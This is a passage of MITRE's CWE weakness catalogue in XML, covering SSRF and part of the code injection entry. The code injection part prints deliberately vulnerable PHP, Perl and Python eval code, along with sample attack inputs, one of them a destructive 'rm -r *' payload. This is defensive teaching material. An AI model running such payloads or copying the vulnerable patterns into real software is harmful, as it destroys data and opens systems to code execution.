					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">SQL Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2008-09-09">Failure to Sanitize Data into SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Data within SQL Queries (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve SQL Query Structure (aka 'SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Preserve SQL Query Structure ('SQL Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in an SQL Command ('SQL Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="918" Name="Server-Side Request Forgery (SSRF)" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.</Description>
         <Extended_Description>By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="441" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSPA</Term>
               <Description>Cross Site Port Attack</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-26855</Reference>
               <Description>Server Side Request Forgery (SSRF) in mail server, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-26855</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21973</Reference>
               <Description>Server Side Request Forgery in cloud platform, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21973</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2016-4029</Reference>
	      <Description>Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2016-4029</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1484</Reference>
               <Description>Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1484</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2061</Reference>
               <Description>CGI script accepts and retrieves incoming URLs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2061</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1637</Reference>
               <Description>Web-based mail program allows internal network scanning using a modified POP3 port number.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-1637</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0037</Reference>
               <Description>URL-downloading library automatically follows redirects to file:// and scp:// URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0037</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="664"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-913"/>
            <Reference External_Reference_ID="REF-914"/>
            <Reference External_Reference_ID="REF-915"/>
            <Reference External_Reference_ID="REF-916"/>
            <Reference External_Reference_ID="REF-917"/>
            <Reference External_Reference_ID="REF-918"/>
            <Reference External_Reference_ID="REF-919"/>
            <Reference External_Reference_ID="REF-920"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the "Server" portion of the SSRF acronym does not necessarily apply.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-02-17</Submission_Date>
               <Submission_Version>2.4</Submission_Version>
               <Submission_ReleaseDate>2013-02-21</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="94" Name="Improper Control of Generation of Code ('Code Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.</Description>
         <Extended_Description>
            <xhtml:p>When a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. Such an alteration could lead to arbitrary code execution.</xhtml:p>
            <xhtml:p>Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Interpreted" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
           <Detection_Method Detection_Method_ID="DM-14">
             <Method>Automated Static Analysis</Method>
             <Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</Description>
             <Effectiveness>High</Effectiveness>
           </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Refactor your program so that you do not have to dynamically generate code.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product.</xhtml:p>
                  <xhtml:p>Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>To reduce the likelihood of code injection, use stringent allowlists that limit which constructs are allowed. If you are dynamically constructing code that invokes a function, then verifying that the input is alphanumeric might be insufficient. An attacker might still be able to reference a dangerous function that you did not intend to allow, such as system(), exec(), or exit().</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Compilation or Build Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-32">
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>For Python programs, it is frequently encouraged to use the ast.literal_eval() function instead of eval, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].</xhtml:p>
               </Description>
			   <Effectiveness>Discouraged Common Practice</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-32">
               <Intro_Text>This example attempts to write user messages to a message file and allow users to view them.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$MessageFile = "messages.out";<xhtml:br/>if ($_GET["action"] == "NewMessage") {<xhtml:div style="margin-left:1em;">$name = $_GET["name"];<xhtml:br/>$message = $_GET["message"];<xhtml:br/>$handle = fopen($MessageFile, "a+");<xhtml:br/>fwrite($handle, "&lt;b&gt;$name&lt;/b&gt; says '$message'&lt;hr&gt;\n");<xhtml:br/>fclose($handle);<xhtml:br/>echo "Message Saved!&lt;p&gt;\n";</xhtml:div>}<xhtml:br/>else if ($_GET["action"] == "ViewMessages") {<xhtml:div style="margin-left:1em;">include($MessageFile);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends for the MessageFile to only include data, an attacker can provide a message such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>name=h4x0r<xhtml:br/>message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E</xhtml:div>
               </Example_Code>
               <Body_Text>which will decode to the following:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>&lt;?php system("/bin/ls -l");?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer thought they were just including the contents of a regular data file, but PHP parsed it and executed the code. Now, this code is executed any time people view messages.</Body_Text>
               <Body_Text>Notice that XSS (CWE-79) is also possible in this situation.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-31">
               <Intro_Text>edit-config.pl: This CGI script is used to modify settings in a configuration file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>use CGI qw(:standard);<xhtml:br/>
                     <xhtml:br/>sub config_file_add_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to add a field/key to a file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_set_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to set key to a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub config_file_delete_key {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $key, $arg) = @_;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># code to delete key from a particular file goes here</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>sub handleConfigAction {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>my ($fname, $action) = @_;<xhtml:br/>my $key = param('key');<xhtml:br/>my $val = param('val');<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># this is super-efficient code, especially if you have to invoke</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i># any one of dozens of different functions!</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>my $code = "config_file_$action_key(\$fname, \$key, \$val);";<xhtml:br/>eval($code);</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>$configfile = "/home/cwe/config.txt";<xhtml:br/>print header;<xhtml:br/>if (defined(param('action'))) {<xhtml:div style="margin-left:1em;">handleConfigAction($configfile, param('action'));</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">print "No action specified!\n";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The script intends to take the 'action' parameter and invoke one of a variety of functions based on the value of that parameter - config_file_add_key(), config_file_set_key(), or config_file_delete_key(). It could set up a conditional to invoke each function separately, but eval() is a powerful way of doing the same thing in fewer lines of code, especially when a large number of functions or variables are involved. Unfortunately, in this case, the attacker can provide other values in the action parameter, such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>This would produce the following string in handleConfigAction():</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>config_file_add_key(",","); system("/bin/ls");</xhtml:div>
               </Example_Code>
               <Body_Text>Any arbitrary Perl code could be added after the attacker has "closed off" the construction of the original function call, in order to prevent parsing errors from causing the malicious eval() to fail before the attacker's payload is activated. This particular manipulation would fail after the system() call, because the "_key(\$fname, \$key, \$val)" portion of the string would cause an error, but this is irrelevant to the attack because the payload has already been activated.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-156">
              <Intro_Text>This simple script asks a user to supply a list of numbers as input and adds them together.</Intro_Text>
              <Example_Code Nature="Bad" Language="Python">
                <xhtml:div>
                  def main():<xhtml:br/>
                  <xhtml:div style="margin-left:1em;">
                    sum = 0<xhtml:br/>
                    numbers = eval(input("Enter a space-separated list of numbers: "))<xhtml:br/>
                    for num in numbers:<xhtml:br/>
                    <xhtml:div style="margin-left:1em;">
                      sum = sum + num<xhtml:br/>
                    </xhtml:div>
                    print(f"Sum of {numbers} = {sum}")
                  </xhtml:div>
                  main()
                </xhtml:div>
              </Example_Code>
              <Body_Text>The eval() function can take the user-supplied list and convert it into a Python list object, therefore allowing the programmer to use list comprehension methods to work with the data. However, if code is supplied to the eval() function, it will execute that code. For example, a malicious user could supply the following string:</Body_Text>
              <Example_Code Nature="Attack">
                <xhtml:div>__import__('subprocess').getoutput('rm -r *')</xhtml:div>
              </Example_Code>
              <Body_Text>This would delete all the files in the current directory. For this reason, it is not recommended to use eval() with untrusted input.</Body_Text>
	      <Body_Text>A way to accomplish this without the use of eval() is to apply an integer conversion on the input within a try/except block. If the user-supplied input is not numeric, this will raise a ValueError. By avoiding eval(), there is no opportunity for the input string to be executed as code.</Body_Text>
              <Example_Code Nature="Good" Language="Python">
                <xhtml:div>
                  def main():<xhtml:br/>
                  <xhtml:div style="margin-left:1em;">
                    sum = 0<xhtml:br/>
                    numbers = input("Enter a space-separated list of numbers: ").split(" ")<xhtml:br/>
                    try:<xhtml:br/>
                    <xhtml:div style="margin-left:1em;">
                      for num in numbers:<xhtml:br/>
                      <xhtml:div style="margin-left:1em;">
                        sum = sum + int(num)<xhtml:br/>
                      </xhtml:div>
                      print(f"Sum of {numbers} = {sum}")
                    </xhtml:div>
                    except ValueError:<xhtml:br/>
                    <xhtml:div style="margin-left:1em;">
                      print("Error: invalid input")<xhtml:br/>
                    </xhtml:div>
                  </xhtml:div>
                  main()
                </xhtml:div>
              </Example_Code>
              <Body_Text>An alternative, commonly-cited mitigation for this kind of weakness is to use the ast.literal_eval() function, since it is intentionally designed to avoid executing code. However, an adversary could still cause excessive memory or stack consumption via deeply nested structures [REF-1372], so the python documentation discourages use of ast.literal_eval() on untrusted data [REF-1373].</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-2054</Reference>
               <Description>Python compiler uses eval() to execute malicious strings as Python code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-2054</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-22204</Reference>
               <Description>Chain: regex in EXIF processor code does not correctly determine where a string ends (CWE-625), enabling eval injection (CWE-95), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22204</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-8218</Reference>
               <Description>"Code injection" in VPN product, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-8218</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5071</Reference>
               <Description>Eval injection in PHP program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5071</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1750</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1750</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1752</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1752</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1753</Reference>
               <Description>Eval injection in Perl program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1753</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1527</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1527</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2837</Reference>
               <Description>Direct code injection into Perl eval function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2837</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1921</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1921</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2498</Reference>
               <Description>MFV. code injection into PHP eval statement using nested constructs that should not be nested.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2498</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3302</Reference>
               <Description>Code injection into Python eval statement from a field in a formatted file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3302</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1253</Reference>
               <Description>Eval injection in Python program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1253</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1471</Reference>
               <Description>chain: Resultant eval injection. An invalid value prevents initialization of variables, which can be modified by attacker and later injected into PHP eval statement.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1471</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0495</Reference>
               <Description>Perl code directly injected into CGI library file from parameters to another CGI program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0495</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1876</Reference>
               <Description>Direct PHP code injection into supporting template file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1876</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1894</Reference>
               <Description>Direct code injection into PHP script that can be accessed by attacker.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1894</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0395</Reference>
               <Description>PHP code from User-Agent HTTP header directly inserted into log file implemented as PHP script.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0395</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_ID>CODE</Entry_ID>
               <Entry_Name>Code Evaluation and Injection</Entry_Name>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
			  <Entry_Name>Req CR 3.5</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
			  <Entry_Name>Req SR 3.5</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SVV-1</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-1</Entry_ID>
			  <Entry_Name>Req SVV-3</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="242"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <References>
